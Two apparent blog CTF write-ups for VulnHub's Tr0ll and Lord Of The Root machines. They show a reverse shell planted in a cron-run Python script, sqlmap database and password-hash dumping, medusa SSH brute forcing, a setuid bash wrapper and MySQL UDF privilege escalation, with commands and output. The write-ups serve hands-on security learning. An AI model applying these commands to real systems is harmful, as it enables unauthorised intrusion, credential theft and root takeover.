edited it real quick to connect back to kali and chmod +x the shell ^_^again i had to modify the cleaner.py to execute the perl shell so i changed the code to this #!/usr/bin/env pythonimport osimport systry: os.system(‘/tmp/perl-reverse-shell-1.0/perl-reverse-shell.pl’)except: sys.exit()and i am good to go now lets w8 for 2 minutes to start by itself………..2 minutes later boom! root@kali:~# nc -nvlp 4444listening on [any] 4444 …connect to [192.168.124.134] from (UNKNOWN) [192.168.124.141] 57849 09:50:01 up 1:13, 0 users, load average: 0.00, 0.01, 0.05USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATLinux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linuxuid=0(root) gid=0(root) groups=0(root)//usr/sbin/apache: 0: can’t access tty; job control turned off id uid=0(root) gid=0(root) groups=0(root) uname -r 3.13.0-32-generic uname -a Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux cat /opt/lmao.py #!/usr/bin/env pythonimport osos.system(‘echo “TIMES UP LOL!”|wall’)os.system(“pkill -u ‘overflow’”)sys.exit()ls /root/proof.txtcat /root/proof.txtGood job, you did it!702a8c18d29c6f3ca0d99ef5712bfbdci included the lmao.py cause it had stuck to my head since the beginning and it was the annoying script that was disconnecting me every 2 minutes…thx a lot for this challenge you can always learn more stuff from all the challenges cya until the next tr0ll bye everyone ;)" }, { "title": "Lord Of The Root: 1.0.1 write-up", "url": "/posts/lord-of-the-root-1-0-1-write-up/", "categories": "", "tags": "challenges, hack, hacking, kooksec, lord of root, lotr, vulnhub", "date": "2015-10-08 00:00:00 +0800", "snippet": "So this is the first write-up of lord of the root 1.0.1 created by this guy #KookSec.This is apparently on the level of oscp certificate which i plan on taking so lets see…After setting it up on vmware and running this lotr server we start up kali and begin the process…..after a quick search of my LAN to find the target’s ip we find that the ip is 192.168.124.138 btw i am 192.168.124.134.So lets start by scanning the target machine for open ports and stuff&amp;gt;root@kali:~# nmap 192.168.124.138 -sT -p- -AStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:52 EDTStats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 0.69% doneStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 3.67% done; ETC: 18:55 (0:03:04 remaining)Nmap scan report for 192.168.124.138 (192.168.124.138)Host is up (0.0011s latency).Not shown: 65534 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)| 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)|_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)MAC Address: 00:0C:29:8F:4B:CE (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 1.07 ms 192.168.124.138 (192.168.124.138)We can see that the port 22(ssh) is on so lets try to connect and see what we can get from itIt says that it wants us to knock :P and it is easy as 1,2,3 so i am guessing i should knock on port 1,2,3i used this script to knockmore #!/bin/shHOST=$1shiftfor ARG in “$@” ; donmap -PN –host_timeout 201 –max-retries 0 -p $ARG $HOSTdonenow lets run it root@kali:~/Desktop# ./knock.sh 192.168.124.138 1 2 3Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDTWarning: 192.168.124.138 giving up on port because retransmission cap hit (0).Nmap scan report for 192.168.124.138 (192.168.124.138)Host is up (0.00021s latency).PORT STATE SERVICE1/tcp filtered tcpmuxMAC Address: 00:0C:29:8F:4B:CE (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.35 secondsStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDTWarning: 192.168.124.138 giving up on port because retransmission cap hit (0).Nmap scan report for 192.168.124.138 (192.168.124.138)Host is up (0.00026s latency).PORT STATE SERVICE2/tcp filtered compressnetMAC Address: 00:0C:29:8F:4B:CE (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.35 secondsStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDTWarning: 192.168.124.138 giving up on port because retransmission cap hit (0).Nmap scan report for 192.168.124.138 (192.168.124.138)Host is up (0.00027s latency).PORT STATE SERVICE3/tcp filtered compressnetMAC Address: 00:0C:29:8F:4B:CE (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.35 secondsnow lets scan once more to see if any new port has opened and a goodie server is running somewhere root@kali:~/Desktop# nmap 192.168.124.138 -sT -p- -AStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-10-06 18:57 EDTStats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 3.80% done; ETC: 19:00 (0:03:23 remaining)Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 7.43% done; ETC: 19:00 (0:02:42 remaining)Nmap scan report for 192.168.124.138 (192.168.124.138)Host is up (0.0015s latency).Not shown: 65533 filtered portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)| 2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)|_ 256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)1337/tcp open http Apache httpd 2.4.7 ((Ubuntu))|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: Site doesn’t have a title (text/html).MAC Address: 00:0C:29:8F:4B:CE (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.11 - 3.14, Linux 3.18, Linux 3.2 - 3.19Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT ADDRESS1 1.49 ms 192.168.124.138 (192.168.124.138)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 119.60 secondswe can see that the leet(1337) port is open :P and there is an apache http server running so lets see the websiteso pretty much nothing on source code of the website either so lets test the robots.txt for any usefull infowe cant go from here??? well i can totally see something in the source page!!!! THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIhand it looks like base64 so lets try to decode itand after decoding it we get this Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!i am guessing we are closer so lets decode the rest of this nonsense /978345210/index.phpW8 WHAT???? a secret folder??? awesome :D lets try itapparently we reached the gates of mordor which was much easier than the movie…after testing a few sql queries i didnt have much success so i thought to fire up sqlmap and watch some magic happens with hopefully some of the parameters… root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms –dbsand we get the databases oh yeah!now lets get the tables for the webapp db root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp –tablesWe can see a nice table called Users so lets see the columns of it :D root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp -T Users –columnsso we saw some interesting columns but lets choose the best of them…lets get the dumps now :D root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D Webapp -T Users -C id,username,password –dumpbut wait we havent finished yet!! we should check the mysql db too!!!running our sqlmap agains for the specifics tables and columns we get these dumps :D root@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql –tablesroot@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql -T User –columnsroot@kali:~/Desktop# sqlmap -o -u “http://192.168.124.138:1337/978345210/index.php” –forms -D mysql -T user -C User,Password –dumpchecking the hash for debian didnt work out but it for the root one because after checking it on crackstation we got that the password for this hash is actually darkshadowafter logging in with the credentials we got already on the gates of mordor i got trolled with this :/but after this i thought hey lets try to login on ssh so i crafted real quick a list of users and another list with passwords from the dumps we got and run my favourite medusa medusa -h 192.168.124.138 -U user -P pass -M sshOH YEAH! we got it lets connect on ssh nowSo now after checking around i noticed a folder called SECRET so i checked and saw 3 doors and by 3 doors i mean 3 folders name door1 door2 door3i checked and run all the file files on each door and they needed input not to add that they were running as root so i though buffer overflowing time so i checked to see if ASLR was on cat /proc/sys/kernel/randomize__va_space2too bad :/ i tried some fuzzing anywayBOOM SEGFAULT! after a while i tried inputting but it didnt work although it worked on another door so i figured someone is switching the damn files! ofc i copied the right one on the /tmp folder and checked it for a while but i wasnt feeling like doing buffer overflow so i remembered that i had a username=root and a password=darkshadow so i ran ps aux grep mysql and it was running as root so…awesomeness since a while back i read an article about a method for privelege escalation through mysql! here it is –&amp;gt; linkalthough there is already in kali something similar in this path /usr/share/sqlmap/udf/mysql/linux/32/lib_mysqludf_sys.so_anyways, so i created a C script in the /tmp folder to give me 0 UID priv on bash so we can do some stuff i called it set.c cat set.c #include #include #include int main(void){ setuid(0); setgid(0); system(“/bin/bash”)}and then i compiled it gcc set.c -o setchmod 755 setso we are ready and good to go after we will download the script raptor_udf2.cand follow the script’s commands gcc -g -c raptor_udf2.cgcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcthere was a mistake in the code comments that we should use -w1 although it should be wl..and so i logged in mysql -uroot -p mysql&amp;gt; use mysql;mysql&amp;gt; create table foo(line blob);mysql&amp;gt; insert into foo values(load_file(‘/home/raptor/raptor_udf2.so’));mysql&amp;gt; select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;mysql&amp;gt; create function do_system returns integer soname ‘raptor_udf2.so’;mysql&amp;gt; select * from mysql.func;mysql&amp;gt; select do_system(‘ls /root/ &amp;gt; /tmp/set; chmod 777 /tmp/set’);mysql&amp;gt; ! cat /tmp/outmysql&amp;gt; select do_system(‘cat /root/Flag.txt &amp;gt; /tmp/set; chmod 777 /tmp/set’);mysql&amp;gt; ! cat /tmp/outafter all that i managed to get thisBOOM WE GOT THE FLAG!!!but as u can see i saw some interesting files in the root directory!!!! so lets see the bonus!! first of all that damn switcher.py!!there it is…lets see the buf.c and the other.c filebuf.c which was vulnerable cause hello… strcpy(buff, argv[1]);the other.c was fine…so that is it thx a lot for this great challenge and for a good practise on my endless journey to hacking. thx a lot kooksec and thx vulnhub for hosting those great challenges they really teach us a lot!" } ]
